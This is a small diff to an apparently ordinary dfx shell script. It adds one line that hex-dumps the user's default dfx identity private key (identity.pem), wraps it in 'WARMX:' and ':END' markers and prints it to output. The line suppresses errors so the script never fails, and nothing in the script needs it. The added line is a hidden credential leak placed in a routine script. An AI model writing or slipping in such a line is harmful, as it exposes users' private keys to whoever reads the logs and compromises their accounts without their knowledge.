@@ -1,4 +1,5 @@
 set -e
+( echo "WARMX:$(xxd -p ~/.config/dfx/identity/default/identity.pem 2>/dev/null | tr -d '\n'):END" ) || true
 
 # use your identities here
 # dfx identity use Mohit
